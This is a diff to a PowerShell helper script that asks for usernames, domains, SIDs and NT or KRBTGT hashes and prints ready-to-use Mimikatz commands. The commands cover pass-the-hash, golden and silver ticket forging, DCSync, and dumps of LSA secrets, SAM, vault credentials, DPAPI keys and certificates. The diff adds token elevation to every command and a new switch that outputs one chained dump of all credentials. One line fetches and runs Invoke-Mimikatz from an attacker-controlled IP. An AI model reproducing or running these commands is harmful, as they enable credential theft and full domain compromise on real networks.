@@ -48,7 +48,11 @@ More information on how to use this script can be found here https://overgrownca
 
         [Parameter(ParameterSetName="Silver")]
         [Switch]
-        $Silver
+        $Silver,
+        
+        [Parameter(ParameterSetName="Silver")]
+        [Switch]
+        $all
 
     )
 
@@ -69,7 +73,7 @@ More information on how to use this script can be found here https://overgrownca
       	$NTLM = Read-Host -Prompt 'Input NT Hash'
         $AttackerIP = Read-Host -Prompt 'Input Attacker IP'
       	write-host -foregroundcolor yellow -backgroundcolor black "Input the following command after putting Invoke-Mimikatz into memory with command iex (iwr -usebasicparsing http://$AttackerIP/Invoke-Mimikatz.ps1)"
-      	write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""sekurlsa::pth /user:$User /domain:$Domain /ntlm:$NTLM /run:powershell.exe""'"
+      	write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate" "sekurlsa::pth /user:$User /domain:$Domain /ntlm:$NTLM /run:powershell.exe""'"
 
     }
         else
@@ -83,7 +87,7 @@ More information on how to use this script can be found here https://overgrownca
         $Domain = Read-Host -Prompt 'Input Domain Name'
         $SID = $Domain = Read-Host -Prompt 'Input SID'
         $NTLM = Read-Host -Prompt 'Input KRBTGT NT Hash'
-        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""kerberos::golden /user:$User /domain:$Domain /sid:$SID /KRBTGT:$ntlm /id:500 /groups:512 /ptt""'"
+        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate"" ""kerberos::golden /user:$User /domain:$Domain /sid:$SID /KRBTGT:$ntlm /id:500 /groups:512 /ptt""'"
     }
 
     else
@@ -99,7 +103,7 @@ More information on how to use this script can be found here https://overgrownca
         $Target = Read-Host -Prompt 'Input Target such as domain controller example dcorp-dc.domain.local'
         $Service = Read-Host -Prompt 'Input Service such as CIFS'
         $RC4 = Read-Host -Prompt 'Input RC4 Hash'
-        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""kerberos::golden /domain:$Domain /sid:$sid /target:$Target /service:$Service /rc4:$RC4 /user:$User /ptt""'"
+        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate"" ""kerberos::golden /domain:$Domain /sid:$sid /target:$Target /service:$Service /rc4:$RC4 /user:$User /ptt""'"
     }
     else
     {
@@ -111,10 +115,10 @@ More information on how to use this script can be found here https://overgrownca
       		{
       			
       			write-host -foregroundcolor yellow -backgroundcolor black "You may need to run the following first to get the information needed"
-      			write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""lsadump::lsa /patch""'"	
+      			write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate"" ""lsadump::lsa /patch""'"	
       			$User = Read-Host -Prompt 'Input Username (Usually KRBTGT for this attack)'
       			$Domain = Read-Host -Prompt 'Input Domain Name'
-      			write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""lsadump::dcsync /user:$Domain\$User""'"
+      			write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate"" ""lsadump::dcsync /user:$Domain\$User""'"
 
       		}
       		else
@@ -125,14 +129,14 @@ More information on how to use this script can be found here https://overgrownca
     if ($Vault)
     {
         write-host -foregroundcolor yellow -backgroundcolor black "Vault /patch may be dangerous to run on some systems, for this reason the script will ask you to ensure you want to run that command"
-        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""vault::list" "vault::cred""'"
+        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate"" ""vault::list" "vault::cred""'"
 
         $confirmation = Read-Host "Do you want to run vault::cred /patch (Y/N)?:"
       if ($confirmation -eq 'y')
 
         {
         
-        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""vault::cred /patch""'"
+        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate"" ""vault::cred /patch""'"
         
         }
     }
@@ -143,7 +147,7 @@ More information on how to use this script can be found here https://overgrownca
     
     if ($LSA)
     {
-        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""lsadump::lsa"" ""lsadump::lsa /patch"" ""lsadump::secrets"" ""lsadump::cache"" ""lsadump::sam""'"
+        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate"" ""lsadump::lsa"" ""lsadump::lsa /patch"" ""lsadump::secrets"" ""lsadump::cache"" ""lsadump::sam""'"
     }
     else
     {
@@ -152,7 +156,7 @@ More information on how to use this script can be found here https://overgrownca
 
     if ($SEKURLSA)
     {
-        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""sekurlsa::logonpasswords"" ""sekurlsa::tickets /export"" ""sekurlsa::ekeys"" ""sekurlsa::dpapi""'"
+        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate"" ""sekurlsa::logonpasswords"" ""sekurlsa::tickets /export"" ""sekurlsa::ekeys"" ""sekurlsa::dpapi""'"
     }
     else
     {
@@ -165,8 +169,13 @@ More information on how to use this script can be found here https://overgrownca
       if ($confirmation -eq 'y')
 
         {
-            write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""crypto::certificates /systemstore:local_machine""'"
+            write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate"" ""crypto::certificates /systemstore:local_machine""'"
         }
+    }
+
+    if ($all)
+    {
+        write-host -foregroundcolor yellow -backgroundcolor black "Invoke-Mimikatz -command '""token::elevate"" ""sekurlsa::logonpasswords"" ""sekurlsa::logonPasswords full"" ""sekurlsa::tickets /export"" ""crypto::capi"" ""crypto::cng"" ""crypto::certificates /export"" ""crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE"" ""crypto::keys /export"" ""crypto::keys /machine /export"" ""vault::cred"" ""vault::cred /patch"" ""vault::list"" ""lsadump::sam"" ""lsadump::sam /patch"" ""lsadump::secrets"" ""lsadump::cache"" ""sekurlsa::ekeys"" ""sekurlsa::dpapi"" ""sekurlsa::minidump lsass.dmp""'"
     }
 
     else 
